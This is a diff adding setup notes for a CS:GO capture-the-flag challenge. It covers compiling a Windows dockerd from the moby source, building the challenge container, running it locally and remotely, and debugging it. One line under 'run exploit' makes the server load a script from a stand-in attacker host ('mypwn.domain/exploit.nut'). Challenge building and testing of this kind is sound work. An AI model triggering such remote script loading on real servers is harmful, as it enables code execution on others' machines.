@@ -1,0 +1,75 @@
+edit you docker daemon.json to include bigger storage
+
+https://github.com/adamrehn/ue4-docker/pull/147
+
+https://master.dockerproject.com/windows/x86_64/dockerd.exe is broken, you need to compile it yourself
+
+Docker iwth Windows Containers has problems with large files, we need the master branch
+
+## building dockerd:
+
+in cmd.exe
+
+docker pull mcr.microsoft.com/windows/servercore:20H2
+docker tag mcr.microsoft.com/windows/servercore:20H2 microsoft/windowsservercore
+git clone https://github.com/moby/moby.git
+cd moby
+
+docker build -t windows-moby-builder --isolation=process -f Dockerfile.windows .
+docker run --isolation=process --name windows-moby-binaries -e DOCKER_GITCOMMIT=b90dd66b windows-moby-builder hack\make.ps1 -Binary
+[needs priv]
+move "%ProgramFiles%\Docker\Docker\resources\dockerd.exe" "%ProgramFiles%\Docker\Docker\resources\dockerd.exe.bak"
+docker cp windows-moby-binaries:C:\gopath\src\github.com\docker\docker\bundles\dockerd.exe "%ProgramFiles%\Docker\Docker\resources\dockerd.exe"
+[---------------]
+docker rm windows-moby-binaries
+docker image rm windows-moby-builder
+cd ..
+rmdir moby /S /Q
+
+*restart docker*
+
+docker version:
+Client:
+ Cloud integration: 1.0.17
+ Version:           20.10.7
+ API version:       1.41
+ Go version:        go1.16.4
+ Git commit:        f0df350
+ Built:             Wed Jun  2 12:00:56 2021
+ OS/Arch:           windows/amd64
+ Context:           default
+ Experimental:      true
+
+Server:
+ Engine:
+  Version:          0.0.0-dev
+  API version:      1.42 (minimum version 1.24)
+  Go version:       go1.16.6
+  Git commit:       ada51d6d29
+  Built:            07/30/2021 00:53:37
+  OS/Arch:          windows/amd64
+  Experimental:     false
+
+## build the challenge (this will take some while, multiple hours for me) (needs investigation)
+
+docker build --isolation=process -t csgo-chal .
+
+# extract setup for local testing
+docker run  --isolation=process --rm -d --name csgo-temp csgo-chal cmd
+docker cp csgo-temp:C:/csgo-ds ./test-server
+docker stop csgo-temp
+
+# run setup locally
+docker run --rm -p 27015:27015/udp --isolation=process -e PORT=27015 -e LAN=1 -e PASSWD=secret csgo-chal
+
+# run setup like remote (remote has to use process isolation, because srcds segfaults otherwise on level start here: https://github.com/perilouswithadollarsign/cstrike15_src/blob/f82112a2388b841d72cb62ca48ab1846dfcc11c8/datacache/datacache.cpp#L440 )
+docker run --rm -p 27015:27015/udp --isolation=process -m 4g -e PORT=27015 -e TOKEN=<steam token> -e PASSWD=secret csgo-chal
+
+# run exploit:
+
+type in cs_go console: say !sm_sq "http://mypwn.domain/exploit.nut"
+
+#debug inside container
+on host:
+cdb -premote tcp:port=22,clicon=0.0.0.0 C:\csgo-ds\srcds.exe -game csgo -port 27040 -console -insecure -usercon +game_type 0 +game_mode 1 +mapgroup mg_bomb +map de_dust2 +sv_lan 1 +con_logfile log.log +sv_password secret +sv_tags hidden +sv_hibernate_when_empty 0
+docker run --rm -p 27040:27040/udp --isolation=process -e PORT=22 -e IP=<host> --name csgo-chal-dbg-instance csgo-chal-dbg
